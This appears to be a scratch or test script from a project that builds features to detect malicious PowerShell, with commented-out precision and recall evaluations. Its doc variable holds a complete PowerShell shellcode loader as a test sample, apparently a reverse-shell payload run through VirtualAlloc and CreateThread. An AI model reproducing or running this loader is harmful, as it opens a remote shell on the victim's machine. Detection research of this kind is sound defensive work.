from email.policy import strict
from turtle import shape
from typing import Counter
from xml.dom import minicompat
from config import *
import numpy as np
import json

from features import URL_IP, Character_length, Information_entropy, ShellCode_Detect, Special_variable_names, Top_five_characters
ngrams = []
q = 'uwb516516'
s = ['123', '23', 'd']
# ngrams.append('--'.join(q[0:5]))
# print(ngrams)
# docs = np.array([[0,0,0,1,3,5,6],[0,1,6,3,10,1,2],[1,1,1,1,2,3,7]])
# doc = [1,2,3,4,5,6,7,8,9]
import re
# print(np.max(docs) + 1)
# text = 'adwdwad w12aw12,,,w40040890wa88//,,1#'
# text = re.sub("\d+", "*", text)
# text = re.sub("[^a-zA-Z*$]+", " ", text)
# print(text)
doc = '$c = \'[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);\';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x31,0x31,0xc5,0x58,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};'

# doc = re.sub("\d+", "*", doc)
# doc = re.sub("[^a-zA-Z*$]", " ", doc)
# doc = re.split(r'[ \)\({};]', doc)
# # print(doc)
# print([x.strip() for x in doc if x.strip()!='' and x.strip() != '*' and (not re.findall(r'\*x.*?\*', x.strip()))])
# from keras.preprocessing.text import Tokenizer
# min_count = 1
# docs = ['dwfa fwff af af', 'daw w0e 29--51 aw', 'w 58p p-p-p']
# # docs = create_docs(df)
# tokenizer = Tokenizer(lower=True, filters='')
# tokenizer.fit_on_texts(docs)
# num_words = sum([1 for _, v in tokenizer.word_counts.items() if v >= min_count])
# print(tokenizer.word_counts)
import numpy as np
a = np.array([[1,2,6],[0,0,9]])
b = np.array([3,4,6,1,0,0])
# print(np.hstack((a.T,b.T)))
# print(sum(a == b))
print(np.array([np.argmax(a, axis=1)]))



# with open(Trainjson, mode='r', encoding='utf-8') as f:
#     file = json.load(f, strict=False) # dict type
# print(file[0])
'''
accuracy = 0
plus = 0  # label = 0 正常样本
minus = 0 # label = 1 恶意、混合样本
TP = 0    # 正类预测为正类
FN = 0    # 正类预测为负类
FP = 0    # 负类预测为正类
TN = 0    # 负类预测为负类

# 选定 label = 1 为正样本， label = 0 为负样本
for line in file:
    if ShellCode_Detect(line['code']) == int(line['label']) and int(line['label']) == 1:
        # accuracy = accuracy + 1
        TP = TP + 1
    if ShellCode_Detect(line['code']) == int(line['label']) and int(line['label']) == 0:
        TN = TN + 1
    if ShellCode_Detect(line['code']) != int(line['label']) and int(line['label']) == 0:
        FP = FP + 1
    if ShellCode_Detect(line['code']) != int(line['label']) and int(line['label']) == 1:
        FN = FN + 1

precise = TP / (TP + FP)   # 精确率：预测为label=1的恶意脚本中有多少是真的malicious powershell
recall = TP / (TP + FN)    # 召回率：原来样本中所有的malicious powershell有多少预测为恶意
print('PRECISE：%f' % precise)
print('RECALL：%f' % recall)
# PRECISE：0.997024
# RECALL：0.478344 这次运行结果表明，shellcode很能表现出恶意脚本，有47%的恶意样本都用到了shellcode
'''


'''
bengin_entropy = 0
bengin_num = 0
malicious_entropy = 0
malicious_num = 0
for line in file:
    if line['label'] == 0:
        bengin_entropy = bengin_entropy + Information_entropy(line['code'])
        bengin_num = bengin_num + 1
    else:
        malicious_entropy = malicious_entropy + Information_entropy(line['code'])
        malicious_num = malicious_num + 1
print('bengin entropy average：', bengin_entropy / bengin_num)
print('malicious entropy average：', malicious_entropy / malicious_num)
'''

# for line in file:
    # print(Top_five_characters(line['code']))
    # print(Character_length(line['code']))
    # print(URL_IP(line['code']))
    # print(Special_variable_names(line['code']))

'''
accuracy = 0
plus = 0  # label = 0 正常样本
minus = 0 # label = 1 恶意、混合样本
TP = 0    # 正类预测为正类
FN = 0    # 正类预测为负类
FP = 0    # 负类预测为正类
TN = 0    # 负类预测为负类

# 选定 label = 1 为正样本， label = 0 为负样本
for line in file:
    if URL_IP(line['code']) == int(line['label']) and int(line['label']) == 1:
        # accuracy = accuracy + 1
        TP = TP + 1
    if URL_IP(line['code']) == int(line['label']) and int(line['label']) == 0:
        TN = TN + 1
    if URL_IP(line['code']) != int(line['label']) and int(line['label']) == 0:
        FP = FP + 1
    if URL_IP(line['code']) != int(line['label']) and int(line['label']) == 1:
        FN = FN + 1

precise = TP / (TP + FP)   # 精确率：预测为label=1的恶意脚本中有多少是真的malicious powershell
recall = TP / (TP + FN)    # 召回率：原来样本中所有的malicious powershell有多少预测为恶意
print('PRECISE：%f' % precise)
print('RECALL：%f' % recall)
# PRECISE：0.835448
# RECALL：0.485721
'''

'''
accuracy = 0
plus = 0  # label = 0 正常样本
minus = 0 # label = 1 恶意、混合样本
TP = 0    # 正类预测为正类
FN = 0    # 正类预测为负类
FP = 0    # 负类预测为正类
TN = 0    # 负类预测为负类

# 选定 label = 1 为正样本， label = 0 为负样本
for line in file:
    if Special_variable_names(line['code']) > 0 and int(line['label']) == 1:
        # accuracy = accuracy + 1
        TP = TP + 1
    if Special_variable_names(line['code']) == 0 and int(line['label']) == 0:
        TN = TN + 1
    if Special_variable_names(line['code']) > 0 and int(line['label']) == 0:
        FP = FP + 1
    if Special_variable_names(line['code']) == 0 and int(line['label']) == 1:
        FN = FN + 1

precise = TP / (TP + FP)   # 精确率：预测为label=1的恶意脚本中有多少是真的malicious powershell
recall = TP / (TP + FN)    # 召回率：原来样本中所有的malicious powershell有多少预测为恶意
print('PRECISE：%f' % precise)
print('RECALL：%f' % recall)
# PRECISE：0.966527
# RECALL：0.329843 ...无话可说
'''



# from features import *

# string = '42145511151http://dhj.fdjjd.com/78078979/dsdfjkk.htm faef aettps://s.weibo.com/weibo?q=%23%E9%95%BF%E6%B4%A5%E6%B9%96%E4%B8%BB%E6%BC%94%E6%9C%AA%E6%9B%9D%E5%85%89%E7%9A%84%E9%80%A0%E5%9E%8B%23&topic_ad='
# a = URL_IP(string)
# print(a)

# string1 = r'{$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","label": 1},{"code": "[void] [System.Reflection.Assembly]::LoadWithPartialName(System.Drawing) [void] [System.Reflection.Assembly]::LoadWithPartialName(System.Windows.Forms) $objForm = New-Object System.Windows.Forms.Form $objForm.Text = Incorrect Key!$objForm.Size = New-Object System.Drawing.Size(300,200) $objForm.StartPosition = CenterScreen$objForm.KeyPreview = $True$objForm.Add_KeyDown({if ($_.KeyCode -eq Enter) {$x=$objTextBox.Text;$objForm.Close()}})$objForm.Add_'
# string1 = 'http://10000000000000000000000000006568535.tkincorrect_email.htmL yes is ahwuwheeeh 192.168.23.451'
# a1 = Special_variable_names(string1)
# print(a1)